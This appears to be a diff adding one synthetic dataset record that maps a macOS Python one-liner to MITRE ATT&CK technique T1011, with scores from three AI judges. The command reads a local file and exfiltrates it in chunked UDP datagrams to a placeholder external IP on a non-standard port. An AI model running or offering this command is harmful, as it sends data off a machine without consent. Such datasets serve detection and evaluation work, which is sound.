@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Python",
+  "command": "python3 -c 'import socket,uuid; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); addr=(\"203.0.113.200\", 53530); tid=str(uuid.uuid4()).encode(); d=open(\"/Users/Shared/.dmp\",\"rb\").read(); [ s.sendto(tid+b\"|\"+d[i:i+500], addr) for i in range(0,len(d),500) ]; s.close()'",
+  "explanation": "Chunks data into UUID-tagged UDP datagrams to a high, non-standard port, simulating a DNS-like alternate medium without using the common DNS port, aligning with T1011.",
+  "rationale_steps": [
+    "Open a UDP socket and choose a non-standard high port (53530) to avoid 53.",
+    "Tag each chunk with a transaction ID to reassemble remotely.",
+    "Use UDP as an alternate medium distinct from primary C2 channels.",
+    "No obfuscation; user-space only."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-e8d4b4c2-022e3e02",
+  "source_prompt_hash": "e8d4b4c2",
+  "timestamp_utc": "2025-09-30T08:45:56.629990Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting and valid Python code that creates a UDP socket, reads a file, chunks data, sends it, and closes the socket.",
+        "semantic_score": 2,
+        "semantic_justification": "While it exfiltrates data via UDP to a high port, this uses the standard IP network rather than a different network medium (e.g., cellular/Wi\u2011Fi/Bluetooth), so it is misaligned with T1011 despite being operationally plausible.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T01:27:45.764446Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and proper syntax for imports, variable assignments, list comprehension, and socket operations.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements T1011 by exfiltrating data from a file over UDP to a remote server using a non-standard port (53530), chunking the data with UUID tags to ensure reassembly, which is a realistic implementation of exfiltration over an alternative network medium.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T01:27:52.983101Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses perfectly formed Python syntax, with balanced delimiters, valid function calls, and proper statement separators, making it well-formed and runnable.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements the described intent of chunking and exfiltrating data via UUID-tagged UDP datagrams to a non-standard port, effectively creating an alternate network channel for data egress consistent with the spirit of T1011.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T06:31:51.491539Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
